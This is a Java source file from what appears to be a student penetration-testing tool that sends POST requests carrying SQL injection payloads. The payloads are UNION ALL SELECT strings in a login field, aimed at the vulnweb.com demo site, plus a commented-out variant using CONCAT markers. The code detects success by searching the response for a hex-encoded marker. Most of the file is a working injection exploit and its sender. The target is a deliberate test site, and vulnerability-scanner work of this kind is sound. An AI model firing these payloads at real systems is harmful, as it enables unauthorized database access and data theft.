/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package ExecutaTestes;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;

import org.apache.http.HttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicHeader;
import static sql.injection.TelaInicial.val;
import static sql.injection.telaDebugger.valDebug;

public class POST {

    public POST() {

    }
    static HttpResponse response;
    static DefaultHttpClient httpclient = new DefaultHttpClient();

    public static void main(String[] args) throws IOException {
        //Start2("uname=123' UNION ALL SELECT NULL,NULL,CONCAT(0x7170707671,0x75774257646759616c594b5a4b765442486c55786c414973456f426576535643666c674f41654449,0x7170716a71),NULL,NULL,NULL,NULL,NULL#&pass=123");
        Start("http://testphp.vulnweb.com/userinfo.php","uname=123' UNION ALL SELECT 0x54434350656e74657374,0x54434350656e74657374,0x54434350656e74657374,0x54434350656e74657374,0x54434350656e74657374,0x54434350656e74657374,0x54434350656e74657374,0x54434350656e74657374#&pass=123");
    }
    public static void Start(String urlR, String postRaw) throws UnsupportedEncodingException, IOException {
        HttpPost httpPost = new HttpPost(urlR);
        StringEntity entitys = new StringEntity(postRaw);
        httpPost.setEntity(entitys);

        httpPost.setHeader(new BasicHeader("Content-type", "application/x-www-form-urlencoded"));
        response = httpclient.execute(httpPost);
        //System.err.println(response.getStatusLine() + " " + "url:" + urlR + " parametros:" + postRaw);
        valDebug.addRow(new String[]{urlR + " " +postRaw,response.getStatusLine().toString(),"POST"});
        BufferedReader rd = new BufferedReader(new InputStreamReader(
                response.getEntity().getContent()));
        String line = "";
        while ((line = rd.readLine()) != null) {            
            if (line.contains("TCCPentest")) {
                val.addRow(new String[]{urlR,postRaw,"Union"});
            }
        }
    }
}
